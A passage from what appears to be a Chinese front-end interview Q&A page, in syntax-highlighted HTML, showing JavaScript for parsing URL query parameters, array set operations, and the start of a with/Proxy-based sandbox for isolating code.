operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//返回：空字符(因为url中没有)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li><p>js获取url中的参数值*</p>\n<p>正则法</p>\n</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"> <span class=\"token keyword\">function</span> <span class=\"token function\">getQueryString</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">var</span> reg <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RegExp</span><span class=\"token punctuation\">(</span><span class=\"token string\">'(^|&amp;)'</span> <span class=\"token operator\">+</span> name <span class=\"token operator\">+</span> <span class=\"token string\">'=([^&amp;]*)(&amp;|$)'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'i'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">var</span> r <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span>reg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n             <span class=\"token keyword\">return</span> <span class=\"token function\">unescape</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token punctuation\">&#125;</span>\n          <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// 这样调用：</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token function\">GetQueryString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"参数名1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token function\">GetQueryString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"参数名2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token function\">GetQueryString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"参数名3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> split拆分法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">GetRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token keyword\">var</span> url <span class=\"token operator\">=</span> location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取url中\"?\"符后的字串</span>\n         <span class=\"token keyword\">var</span> theRequest <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n         <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"?\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                 <span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 strs <span class=\"token operator\">=</span> str<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&amp;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n              <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> strs<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                      theRequest<span class=\"token punctuation\">[</span>strs<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">unescape</span><span class=\"token punctuation\">(</span>strs<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token punctuation\">&#125;</span>\n         <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">return</span> theRequest<span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> Request <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nRequest <span class=\"token operator\">=</span> <span class=\"token function\">GetRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">></span><span class=\"token comment\">// var id=Request[\"id\"]; </span>\n<span class=\"token comment\">// var 参数1,参数2,参数3,参数N;</span>\n<span class=\"token comment\">// 参数1 = Request['参数1'];</span>\n<span class=\"token comment\">// 参数2 = Request['参数2'];</span>\n<span class=\"token comment\">// 参数3 = Request['参数3'];</span>\n<span class=\"token comment\">// 参数N = Request['参数N'];</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> 指定取<br>比如说一个url：<a href=\"https://link.jianshu.com/?t=http://i.cnblogs.com/?j=js\">http://i.cnblogs.com/?j=js</a>, 我们想得到参数j的值，可以通过以下函数调用。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">GetQueryString</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n         <span class=\"token keyword\">var</span> reg <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RegExp</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(^|&amp;)\"</span> <span class=\"token operator\">+</span> name <span class=\"token operator\">+</span> <span class=\"token string\">\"=([^&amp;]*)(&amp;|$)\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"i\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n         <span class=\"token keyword\">var</span> r <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span>reg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取url中\"?\"符后的字符串并正则匹配</span>\n         <span class=\"token keyword\">var</span> context <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span> \n\n     <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> \n     context <span class=\"token operator\">=</span> r<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n    reg <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span> \n    r <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">return</span> context <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">||</span> context <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token operator\">||</span> context <span class=\"token operator\">==</span> <span class=\"token string\">\"undefined\"</span> <span class=\"token operator\">?</span> <span class=\"token string\">\"\"</span> <span class=\"token operator\">:</span> context<span class=\"token punctuation\">;</span> \n <span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token function\">GetQueryString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"j\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> 单个参数的获取方法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">GetRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token keyword\">var</span> url <span class=\"token operator\">=</span> location<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取url中\"?\"符后的字串</span>\n         <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"?\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token operator\">?</span> <span class=\"token comment\">//判断是否有参数</span>\n                  <span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串</span>\n                  strs <span class=\"token operator\">=</span> str<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span> <span class=\"token comment\">//用等号进行分隔 （因为知道只有一个参数 </span>\n                                          <span class=\"token comment\">//所以直接用等号进分隔 如果有多个参数 要用&amp;号分隔 再用等号进行分隔）</span>\n                  <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>strs<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">??</span><span class=\"token operator\">??</span> <span class=\"token comment\">//直接弹出第一个参数 （如果有多个参数 还要进行循环的）</span>\n         <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h3 id=\"48、js中两个数组怎么取交集-差集、并集、补集\"><a href=\"#48、js中两个数组怎么取交集-差集、并集、补集\" class=\"headerlink\" title=\"48、js中两个数组怎么取交集+(差集、并集、补集)\"></a>48、js中两个数组怎么取交集+(差集、并集、补集)</h3><h4 id=\"ES5：\"><a href=\"#ES5：\" class=\"headerlink\" title=\"ES5：\"></a>ES5：</h4><p>交集：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> arr1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> arr2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">getIntersection</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr1<span class=\"token punctuation\">,</span> arr2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> newArr <span class=\"token operator\">=</span> arr1<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arr2<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> arr2<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> newArr<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// console.log(getIntersection(arr1, arr2));</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>并集：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">getSet</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr1<span class=\"token punctuation\">,</span> arr2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> newArr <span class=\"token operator\">=</span> arr2<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> arr1<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> arr1<span class=\"token punctuation\">.</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span>newArr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">getSet</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>补集：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">getComplement</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr1<span class=\"token punctuation\">,</span> arr2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> newArr1 <span class=\"token operator\">=</span> arr1<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> arr2<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> newArr2 <span class=\"token operator\">=</span> arr2<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> arr1<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> newArr1<span class=\"token punctuation\">.</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span>newArr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"ES6：\"><a href=\"#ES6：\" class=\"headerlink\" title=\"ES6：\"></a>ES6：</h4><p>交集：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> arr1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> arr2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">getIntersection</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr1<span class=\"token punctuation\">,</span> arr2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Set</span><span class=\"token punctuation\">(</span>arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> arr1<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> y<span class=\"token punctuation\">.</span><span class=\"token function\">has</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">getIntersection</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>并集：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> arr1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> arr2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">getSet</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr1<span class=\"token punctuation\">,</span> arr2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> arr1<span class=\"token punctuation\">.</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span>arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Set</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">getSet</span><span class=\"token punctuation\">(</span>arr1<span class=\"token punctuation\">,</span> arr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"49、沙箱隔离怎么做的什么原理\"><a href=\"#49、沙箱隔离怎么做的什么原理\" class=\"headerlink\" title=\"49、沙箱隔离怎么做的什么原理\"></a>49、<del>沙箱隔离怎么做的什么原理</del></h3><p><strong>参考答案：</strong></p>\n<p>沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。</p>\n<p>实现沙箱的三种方法</p>\n<ol>\n<li>借助with + new Function</li>\n</ol>\n<p>首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">compileCode</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">src</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>    \n  src <span class=\"token operator\">=</span> <span class=\"token string\">'with (exposeObj) &#123;'</span> <span class=\"token operator\">+</span> src <span class=\"token operator\">+</span> <span class=\"token string\">'&#125;'</span>  \n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Function</span><span class=\"token punctuation\">(</span><span class=\"token string\">'exposeObj'</span><span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">)</span>   \n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">compileCode</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">src</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>    \n  src <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">with (exposeObj) &#123; </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>src<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\"> &#125;</span><span class=\"token template-punctuation string\">`</span></span> \n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Function</span><span class=\"token punctuation\">(</span><span class=\"token string\">'exposeObj'</span><span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">)</span>   \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">function</span> <span class=\"token function\">proxyObj</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">originObj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">let</span> exposeObj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">(</span>originObj<span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span> \n        <span class=\"token function-variable function\">has</span><span class=\"token operator\">:</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">target<span class=\"token punctuation\">,</span>key</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span> \n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"console\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Math\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Date\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  \n                <span class=\"token keyword\">return</span> target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span>  \n            <span class=\"token punctuation\">&#125;</span> \n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>target<span class=\"token punctuation\">.</span><span class=\"token 